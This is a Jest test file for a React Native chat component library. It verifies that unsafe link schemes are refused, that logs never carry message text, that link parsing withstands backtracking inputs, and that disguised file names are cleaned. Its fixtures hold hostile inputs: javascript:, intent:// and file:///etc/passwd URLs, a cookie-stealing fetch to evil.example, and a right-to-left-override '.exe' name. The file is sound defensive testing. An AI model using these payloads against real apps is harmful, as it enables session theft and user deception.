import React from 'react'
import { Linking } from 'react-native'
import { fireEvent } from '@testing-library/react-native'

import { Bubble, IMessage, findFirstUrl } from '..'
import { stripMarkdown } from '../ChatList/utils'
import { BasicMarkdown } from '../components/BasicMarkdown'
import { MediaCard } from '../components/MediaCard'
import { LinkParser } from '../linkParser'
import { displayFileName } from '../MessageFile'
import { MessageRowStore } from '../MessagesContainer/rowStore'
import { MessageText } from '../MessageText'
import { isSafeLinkUrl, isSafeMediaUrl, openLinkUrl, urlScheme } from '../safeUrl'
import { render } from './renderWithGestureRoot'

// Message content comes from whoever sent it: nothing in it may open a dangerous URL, leak
// into the device log or stall the chat.

const UNSAFE_LINKS = [
  'javascript:alert(1)',
  'JavaScript:alert(1)',
  ' javascript:alert(1)',
  '\u0000javascript:alert(1)',
  'java\tscript:alert(1)',
  'java\nscript:alert(1)',
  'vbscript:msgbox(1)',
  'data:text/html,<script>alert(1)</script>',
  'intent://scan/#Intent;scheme=zxing;package=com.example;end',
  'file:///etc/passwd',
  'content://com.example.provider/secret',
  'myapp://pay?amount=100',
  'about:blank',
  '//evil.example/path',
  'evil.example',
  '',
]

const SAFE_LINKS = [
  'https://example.com',
  'HTTP://example.com/a?b=c',
  'mailto:a@example.com',
  'tel:+15551234567',
  'sms:+15551234567',
  ' https://example.com ',
]

const message = (text: string, extra: Partial<IMessage> = {}): IMessage => ({
  _id: 1,
  text,
  createdAt: new Date(2024, 0, 1, 12, 0).getTime(),
  user: { _id: 2, name: 'Alice' },
  ...extra,
})

describe('URL scheme checks', () => {
  it.each(UNSAFE_LINKS)('refuse %j as a link', url => {
    expect(isSafeLinkUrl(url)).toBe(false)
  })

  it.each(SAFE_LINKS)('allow %j as a link', url => {
    expect(isSafeLinkUrl(url)).toBe(true)
  })

  it('allow local files as media, but no script or intent', () => {
    expect(isSafeMediaUrl('file:///data/user/0/app/cache/a.m4a')).toBe(true)
    expect(isSafeMediaUrl('content://media/external/audio/1')).toBe(true)
    expect(isSafeMediaUrl('https://cdn.example.com/a.mp4')).toBe(true)
    expect(isSafeMediaUrl('javascript:alert(1)')).toBe(false)
    expect(isSafeMediaUrl('intent://x#Intent;end')).toBe(false)
    expect(isSafeMediaUrl(undefined)).toBe(false)
  })

  it('read the scheme the way a browser does', () => {
    expect(urlScheme('java\tscr\nipt:alert(1)')).toBe('javascript')
    expect(urlScheme('\u0001 JAVASCRIPT:alert(1)')).toBe('javascript')
    expect(urlScheme('no scheme here')).toBeNull()
  })
})

describe('opening links from messages', () => {
  it('opens a safe link, cleaned, and nothing else', () => {
    const openURL = jest.spyOn(Linking, 'openURL').mockResolvedValue(true)
    jest.spyOn(console, 'log').mockImplementation(() => {})
    openLinkUrl('java\tscript:alert(1)')
    openLinkUrl('intent://x#Intent;end')
    expect(openURL).not.toHaveBeenCalled()

    openLinkUrl(' https://example.com\n')
    expect(openURL).toHaveBeenCalledWith('https://example.com')
  })

  it('logs only the refused scheme, never the rest of the URL', () => {
    jest.spyOn(Linking, 'openURL').mockResolvedValue(true)
    const log = jest.spyOn(console, 'log').mockImplementation(() => {})
    openLinkUrl('javascript:fetch("https://evil.example/?c="+document.cookie)')
    const printed = log.mock.calls.flat().join(' ')
    expect(printed).toContain('"javascript"')
    expect(printed).not.toContain('evil.example')
  })

  it('a markdown link with a script URL does nothing when pressed', async () => {
    const openURL = jest.spyOn(Linking, 'openURL').mockResolvedValue(true)
    jest.spyOn(console, 'log').mockImplementation(() => {})
    const { getByText } = await render(
      <BasicMarkdown text={'[Claim your prize](javascript:alert(document.cookie)) and [docs](https://example.com)'} />
    )
    await fireEvent.press(getByText('Claim your prize'))
    expect(openURL).not.toHaveBeenCalled()

    await fireEvent.press(getByText('docs'))
    expect(openURL).toHaveBeenCalledWith('https://example.com')
  })

  it('a markdown intent link in a message does nothing when pressed', async () => {
    const openURL = jest.spyOn(Linking, 'openURL').mockResolvedValue(true)
    jest.spyOn(console, 'log').mockImplementation(() => {})
    const { getByText } = await render(
      <MessageText currentMessage={message('[Open](intent://x#Intent;package=com.example;end)')} markdown />
    )
    await fireEvent.press(getByText('Open'))
    expect(openURL).not.toHaveBeenCalled()
  })

  it('a custom matcher\'s URL goes through the same check', async () => {
    const openURL = jest.spyOn(Linking, 'openURL').mockResolvedValue(true)
    jest.spyOn(console, 'log').mockImplementation(() => {})
    const { getByText } = await render(
      <LinkParser
        text='see #promo'
        hashtag
        matchers={[{ type: 'hashtag', pattern: /#\w+/g, getLinkUrl: () => 'javascript:alert(1)' }]}
      />
    )
    await fireEvent.press(getByText('#promo'))
    expect(openURL).not.toHaveBeenCalled()
  })

  it('a link preview with a script URL does nothing when tapped', async () => {
    const openURL = jest.spyOn(Linking, 'openURL').mockResolvedValue(true)
    jest.spyOn(console, 'log').mockImplementation(() => {})
    const { getByTestId } = await render(
      <Bubble
        user={{ _id: 1 }}
        position='left'
        currentMessage={message('look https://example.com', { linkPreview: { url: 'javascript:alert(1)', title: 'Prize' } })}
      />
    )
    await fireEvent.press(getByTestId('link-preview'))
    expect(openURL).not.toHaveBeenCalled()
  })

  it('a media card with an intent uri does nothing when tapped', async () => {
    const openURL = jest.spyOn(Linking, 'openURL').mockResolvedValue(true)
    jest.spyOn(console, 'log').mockImplementation(() => {})
    const { getByRole } = await render(<MediaCard kind='video' uri='intent://x#Intent;end' />)
    await fireEvent.press(getByRole('button'))
    expect(openURL).not.toHaveBeenCalled()
  })
})

describe('hostile text', () => {
  const timed = (run: () => unknown) => {
    const start = Date.now()
    run()
    return Date.now() - start
  }

  it('finds links in a long message in bounded time', async () => {
    // Shapes that make the link patterns backtrack, each 200000 characters long.
    const texts = [
      'a.'.repeat(100_000),
      '1'.repeat(200_000),
      'a'.repeat(100_000) + '@' + 'a.'.repeat(50_000),
      'a.co '.repeat(40_000),
    ]
    for (const text of texts) {
      const ms = timed(() => findFirstUrl(text))
      expect(ms).toBeLessThan(3000)
    }
    const { toJSON } = await render(<LinkParser text={'a.'.repeat(100_000)} />)
    expect(toJSON()).toBeTruthy()
  })

  it('still finds the links around a run too long to be one', async () => {
    const { getByText } = await render(
      <LinkParser text={`see https://example.com ${'x'.repeat(10_000)} and mail@example.com`} />
    )
    expect(getByText('example.com')).toBeTruthy()
    expect(getByText('mail@example.com')).toBeTruthy()
  })

  it('keeps every link of a message made of many, in one pass', async () => {
    const text = Array.from({ length: 3000 }, (_, i) => `s${i}.co`).join(' ')
    let tree: unknown
    const ms = timed(() => {
      tree = render(<LinkParser text={text} />)
    })
    await tree
    expect(ms).toBeLessThan(5000)
  })

  it('strips markdown for the chat list from the start of a long message only', () => {
    const ms = timed(() => stripMarkdown('['.repeat(200_000)))
    expect(ms).toBeLessThan(1000)
    expect(stripMarkdown('**bold** and [a link](https://x.com)')).toBe('bold and a link')
  })
})

describe('the device log', () => {
  it('never gets a message\'s text when it has no _id or user', () => {
    const log = jest.spyOn(console, 'log').mockImplementation(() => {})
    const store = new MessageRowStore()
    store.sync([{ text: 'my card number is 4111 1111 1111 1111', createdAt: 0 } as unknown as IMessage], false)
    const printed = log.mock.calls.flat().join(' ')
    expect(printed).toContain('_id')
    expect(printed).not.toContain('4111')
  })
})

describe('file names', () => {
  it('drop the controls that disguise an extension', () => {
    expect(displayFileName('invoice\u202Efdp.exe')).toBe('invoicefdp.exe')
    expect(displayFileName('report.pdf')).toBe('report.pdf')
    expect(displayFileName(undefined)).toBe('')
  })
})
